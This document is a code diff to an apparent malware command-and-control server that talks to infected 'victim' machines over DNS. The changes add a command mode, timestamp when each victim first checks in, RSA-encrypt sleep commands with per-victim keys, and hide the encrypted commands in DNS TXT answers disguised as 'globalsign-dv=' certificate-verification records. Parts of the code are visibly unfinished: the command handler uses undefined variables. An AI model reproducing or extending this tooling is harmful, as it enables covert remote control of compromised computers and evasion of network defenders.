@@ -21,7 +21,11 @@ connections = []
 machineClassList = {}
 activeTargetID = "Zombie"
 activeConnection = None
+commandMode = False
+currentEncodedCommand = []
 console = Console()
+encodedCommandQueue = {}
+
 
 from dnslib import QTYPE, RR, DNSLabel, dns
 from dnslib.server import BaseResolver as LibBaseResolver, DNSServer as LibDNSServer
@@ -82,6 +86,7 @@ class Machine:
         self.pingTime = None
         self.Uptime = 0
         self.victimNotes = victimNotes
+        self.FirstSeen = None
 
     def send_ping(self):
         self.pingTime = datetime.now()
@@ -197,10 +202,11 @@ def list_computers():
     table.add_column("User ID", style="dim")
     table.add_column("Name")
     table.add_column("Uptime")
+    table.add_column("First Seen")
 
     for k,v in machineClassList.items():
         table.add_row(
-        k, v.CustomName, str(v.get_uptime())
+        k, v.CustomName, str(v.get_uptime()), str(v.FirstSeen)
         )
 
     #machineClassList[userid].get_uptime()
@@ -217,8 +223,8 @@ def get_hostname(arg):
 
 
 class Utils:
-    def RSAEncrypt(self, plaintext, private_key):
-        encrypted = base64.b64encode(private_key.encrypt(
+    def RSAEncrypt(self, plaintext, public_key):
+        encrypted = base64.b64encode(public_key.encrypt(
                 plaintext,
                 padding.OAEP(
                 mgf=padding.MGF1(algorithm=hashes.SHA256()),
@@ -296,9 +302,12 @@ class VictimPayloads:
                 console.print(f"[bold yellow][*][/bold yellow] Sent \"sleep\" command to victim, sleeping for {sleepTime} seconds...\n")
                 packet = public_key_hash + "|" + "s" + "|" + str(sleepTime)
                 print(packet)
-                ciphertext = utils.RSAEncrypt(packet, machineClassList[public_key_hash].RSA_private_key)
-                print(ciphertext)
-                return ciphertext
+                ciphertext = utils.RSAEncrypt(packet.encode(), machineClassList[public_key_hash].RSA_Victim_Public_Key)
+                console.print(f"Sleep ciphertext :: {ciphertext}")
+                command_split = [ciphertext[i: i + 220] for i in range(0, len(ciphertext), 220)]
+                for x in command_split:
+                    currentEncodedCommand.append(f"globalsign-dv={x.decode()}")
+                return currentEncodedCommand
 
             case "command":
                 command = kwargs.get('command', None)
@@ -308,10 +317,18 @@ class VictimPayloads:
         print(proto)
 
     def sleep(self, sleepTime, public_key_hash):
+        global commandMode, currentEncodedCommand, encodedCommandQueue
+        currentEncodedCommand.clear()
+        # encodedCommandQueue.update({public_key_hash:[False, "sleep"]})
         packet = self.MethodToPacketEncoder("sleep", public_key_hash, sleepTime=sleepTime)
+        commandMode = True
+        currentEncodedCommand = packet
 
     def command(self, command):
+        global commandMode, currentEncodedCommand
         packet = self.MethodToPacketEncoder("command", public_key_hash, sleepTime=sleepTime)
+        commandMode = True
+        currentEncodedCommand = packet
 
     def exit(self):
         return 0
@@ -468,7 +485,7 @@ def decryptRSAByPublicKey(public_key, message):
 
 
 def decodeCommand(command):
-    global statistics, generatedCertificates, latestVictim, c2Statistics
+    global statistics, commandMode, generatedCertificates, latestVictim, c2Statistics
     try:
         command = base64.b32decode(command).decode()
         command = command.split("|")
@@ -482,15 +499,22 @@ def decodeCommand(command):
                     c2Statistics["Total Victims"] += 1
                     machineClassList.update({command[1]:Machine("DNS", None, x["private_key"], x["public_key"], "Unknown", key)})
                     victimHash = machineClassList[command[1]].RSA_public_key_hash
+                    now = datetime.now()
+                    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
+                    machineClassList[command[1]].FirstSeen = dt_string
                     console.print(f"\n[bold blue]A spaceship arrived![/bold blue]\n[bold blue]\"{victimHash}\"[/bold blue] Called home!")
                     generatedCertificates.clear()
         if(command[0] == "2"):
             machineClassList[command[1]].pingTime = datetime.now()
+        if(command[0] == "s"):
+            console.print(f"[bold blue]Spaceship {command[1]} understood the orders![/bold blue]")
+            commandMode = False
+
 #            console.print(f"{machineClassList[command[1]].send_ping()}")
         #messageResponse = decryptRSAByPublicKey(command[0], command[1])
         #showCommandResults(command[0], command[1])
     except Exception as err:
- #       print(err)
+        print(err)
         pass
 
 
@@ -573,7 +597,7 @@ def generateCertificate():
     return fakeTXTList
 
 def sendDNSresponse(data):
-    global keyProvisioning
+    global keyProvisioning, commandMode, currentEncodedCommand
     try:
         request = DNSRecord.parse(data)
         reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
@@ -586,13 +610,17 @@ def sendDNSresponse(data):
         if qt == "AAAA":
             reply.add_answer(RR(rname=qname, rtype=QTYPE.AAAA, ttl=5, rdata=dns.AAAA(IPV6)))
         if qt == "TXT":
+#            console.print(f"Command mode :: {commandMode}")
             if keyProvisioning == False:
                 reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT("")))
-            else:
+            if commandMode == False:
                 certificate = generateCertificate()
                 reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT(certificate)))
+            else:
+                reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT(currentEncodedCommand)))
         return reply.pack()
-    except:
+    except Exception as err:
+        print(err)
         pass
 
 class DNSServer:
